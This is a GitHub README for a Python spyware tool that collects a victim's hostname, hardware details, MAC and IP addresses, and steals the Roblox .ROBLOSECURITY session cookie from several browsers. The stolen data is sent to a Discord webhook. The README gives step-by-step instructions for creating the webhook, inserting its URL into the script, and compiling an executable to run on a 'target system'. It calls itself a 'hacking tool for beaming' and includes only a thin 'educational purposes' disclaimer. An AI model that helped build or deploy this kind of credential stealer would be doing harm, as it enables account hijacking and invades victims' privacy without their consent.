# WPRInf-Spyware

![Python Version](https://img.shields.io/badge/Python-2.9%2B-blue.svg)
![License](https://img.shields.io/badge/License-MIT-green.svg)
![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey.svg)
![Platform2](https://img.shields.io/badge/Platform-Linux-green.svg)
![GitHub Stars](https://img.shields.io/github/stars/independent-coder/WPRInf-Spyware.svg)

![WPRInf-Spyware Logo](https://cdn-icons-png.flaticon.com/512/1691/1691918.png)

WPRInf-Spyware is a Python script that gathers information about a victim's web and PC and sends it to a Discord webhook. This tool is intended for educational purposes and is released under the MIT license.

This is an improved version of [Roblox-Webhook](https://github.com/independent-coder/Roblox-Webhooks) – smaller, lighter, and more portable.

## Table of Contents
- [Installation](#installation)
  - [Local Install](#local-install)
  - [Setting Up a Webhook](#setting-up-a-webhook)
  - [Editing the File](#editing-the-file)
- [Usage](#usage)
- [Web and PC Information](#web-and-pc-information)
- [License](#license)
- [Message from the Author](#message-from-the-author)

## Installation

### Local Install
First, you need to download [Python](https://www.python.org/downloads/release) for this program to work correctly.

Clone this repository to your local machine.

```bash
git clone https://github.com/independent-coder/WPRInf-Spyware.git
```
Then navigate to the downloaded project.
```bash
cd path\to\the\saved\WPRInf-Spyware
```
Install the required Python packages:
```bash
pip install -r requirements.txt
```
# Setting Up a Webhook

To set up a webhook, follow these steps:

## Step 1: Create a New Server

Begin by creating a new server with no specific recipient for the gathered information.

## Step 2: Configure the Default Channel

1. Access the settings of the default channel.
![Screenshot 1](https://github.com/independent-coder/WPRInf-Spyware/assets/127637860/c7ef22b4-e903-44da-b67f-48e90db065f6)

## Step 3: Access Integration and Webhooks

2. Navigate to the "Integration and Webhooks" section.
![Screenshot 2](https://github.com/independent-coder/WPRInf-Spyware/assets/127637860/825b8ee0-5358-451b-885d-013afb55cd1a)

## Step 4: Create a New Webhook

3. Create a new webhook with a name of your choice.
![Screenshot 3](https://github.com/independent-coder/WPRInf-Spyware/assets/127637860/6a95f8a3-5d4f-4b69-92e1-623bef651c0a)

## Step 5: Copy and Store the Webhook URL

4. Lastly, copy the webhook URL and securely store it.
![Screenshot 4](https://github.com/independent-coder/WPRInf-Spyware/assets/127637860/67e592c0-66a6-46fc-a769-4245adea88b3)

# Editing the File

Now, you'll need a text editor to enter the webhook URL you just copied. Here are a few options:

- [Notepad++](https://notepad-plus-plus.org/downloads/)
- [Sublime Text](https://www.sublimetext.com)
- [Visual Studio Code](https://code.visualstudio.com)
- Or you can use the default Notepad.

Open the [WPRInf-Spy.py](https://github.com/independent-coder/WPRInf-Spyware/blob/main/WPRInf-Spy.py) then go the 97 line and the copied URl then now you can continue.




## Usage
Compile the script using [WPRInf-EXE-Builder](https://github.com/independent-coder/WPRInf-Spyware/blob/main/WPRBuilder.exe) made by me. This will create an executable that you can run on the target system.

But before download it you need to install [AUTO-PY-TO-EXE](https://pypi.org/project/auto-py-to-exe/).

To do this simply execute this command.

```bash
pip install auto-py-to-exe
```
If you don't trust me you can use the manual way to compile using only auto-py-to-exe.

Now let's talk about the thing you can do :

![Screenshot_68](https://github.com/independent-coder/WPRInf-Spyware/assets/127637860/19295933-934b-420a-80db-e1d2319189d8)

![Screenshot_69](https://github.com/independent-coder/WPRInf-Spyware/assets/127637860/b6c24da6-b850-4248-a5d4-05e80535e071)

![Screenshot_70](https://github.com/independent-coder/WPRInf-Spyware/assets/127637860/4f2030d3-09ff-4629-9a93-c6578da47762)


## Web and PC Information
WPRInf-Spyware collects the following information from the victim's system:

- Hostname
- Processor
- RAM
- Machine Architecture
- Operating System
- OS Release
- OS Version
- MAC Address
- Private IP Address

Additionally, it checks for the presence of the .ROBLOSECURITY cookie in various web browsers.

## License
This project is licensed under the MIT License - see the [LICENSE](https://github.com/independent-coder/WPRInf-Spyware/blob/main/LICENSE) file for details.

WPRInf Main Code and WPRInf-EXE-Builder is Made by Independent-coder

## Message from the author

This repository delivers on its promise of a smooth experience with no lag. It is compatible with Windows 7 and higher operating systems, ensuring widespread usability. Moreover, it offers seamless support for 10 different web browsers, making it incredibly versatile. This hacking tool for beaming is highly portable, allowing you to use it on the go, and it boasts a user-friendly GUI interface for the EXE builder, enhancing your overall experience.
